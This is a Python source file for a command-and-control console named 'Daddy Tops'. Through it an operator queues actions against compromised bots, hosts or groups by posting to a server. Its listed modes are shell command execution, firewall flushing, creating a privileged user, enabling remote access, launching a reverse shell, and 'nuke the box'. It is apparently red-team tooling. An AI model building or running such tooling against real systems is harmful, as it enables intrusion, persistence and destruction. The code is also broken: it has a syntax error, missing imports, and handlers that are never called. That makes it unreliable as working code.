import os
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import WordCompleter

server = os.environ.get("DT_SERVER", "http://localhost:8888") 
user = "<username_for_logging>"
dtWords = ['new', 'group', 'action', 'show', 'result']
dtComp = WordCompleter(dtWords)

def handleNew(split_inp):
    print(split_inp)
    return

def handleShow(split_inp):
    print(split_inp)
    return

def handleInput(inp):
    split_inp = inp.split(":")
    first_term = split_inp[0].lower()
    if first_term == "new":
        handleNew(split_inp)
    elif first_term == "show":
        handleShow(split_inp)
    elif first_term == "exit" or first_term == "quit":
        print("Goodbye...")
        exit()
    return

def help():
    print("Daddy Tops Command Line Tool")
    print()
    print("Current Configuration")
    print("Server: " + server)
    print("User: " + user)
    print()
    print("OPTIONS:")
    print("NEW ACTION:              action: <target_hostname>: <action_mode_opcode>: <arguments>")
    print("NEW GROUP ACTION:        gaction: <target_groupname>: <action_mode_opcode>: <arguments>")
    print("SHOW ACTION MODES:       show: modes")
    print("SHOW ACTION RESULT:      show: result: <actionid>")
    print("SHOW TABLE INFO:         show: <table>")
    print("                           -table options: 'bots', 'hosts', 'actions', 'groups', 'db'")
    return

def newAction(args):
    try:
        args = args.split(":", 4)
        target = args[1].strip()
        mode = args[2].strip()
        argum = args[3].strip()
        if args[2] == "help" or args[3] == help:
            showModes()
    except:
        print("Invalid syntax...")
        return
    opt = ""
    header = {'Content-type': 'application/json'}
    data = {"hostname": target, "mode": mode, "arguments": argum, "options": opt, "dtuser": user}
    request = requests.post(server + "/add/command/single", headers=header, data=json.dumps(data))
    if request.text == "success":
        print("SUCCESS! " + mode + " action queued for host: " + target)
    else:
        print(request.text)
    return

def newGroupAction(args):
    try:
        args = args.split(":", 4)
        target = args[1].strip()
        mode = args[2].strip()
        argum = args[3].strip()
    except:
        print("Invalid syntax...")
        return
    opt = ""
    header = {'Content-type': 'application/json'}
    data = {"groupname": target, "mode": mode, "arguments": argum, "options": opt, "dtuser": user}
    request = requests.post(server + "/add/command/group", headers=header, data=json.dumps(data))
    if request.text == "success":
        print("SUCCESS! " + mode + " action queued for group: " + target)
    else:
        print(request.text)
    return

def showModes():
    print("AVAILABLE ACTION MODES:")
    print("OPCODE   MODE                            Args")
    print("--------------------------------------------------------")
    print("1        shell exec                      <shell command>")
    print("2        firewall flush                  N/A")
    print("3        create priv. user               N/A")
    print("4        start/enable remote access      N/A")
    print("5        start reverse shell             <ip:port>")
    print("F        nuke the box                    N/A")




def listObj(args):
    if args args == "show: modes":
        showModes()
        return
    try:
        args = args.split(":", 3)
        obj = args[1].strip()
    except:
        print("Invalid syntax...")
        return
    if obj.lower() not in ["bots", "hosts", "actions", "groups", "db", "database", "result"]:
        print("Unknown object: " + obj + "...")
        print("Options are (not case-sens): bots, hosts, actions, groups, db, result")
        return
    if "result" not in obj:
        url = server + "/list/" + obj
        request = requests.get(url)
        print(request.text)
        return
    else:
        try:
            aid = args[2].strip()
        except:
            print("show: result requires actionid...")
            print("EXAMPLE: `show: result: 45`")
            return
        header = {'Content-type': 'application/json'}
        data = {"actionid": aid}
        request = requests.post(server + "/get/actionresult", headers=header, data=json.dumps(data))
        print(request.text)
        return

while True:
    user_input = prompt('DT>', 
                        history=FileHistory('.dt_history'), 
                        auto_suggest=AutoSuggestFromHistory(), 
                        completer=dtComp)
    handleInput(user_input)
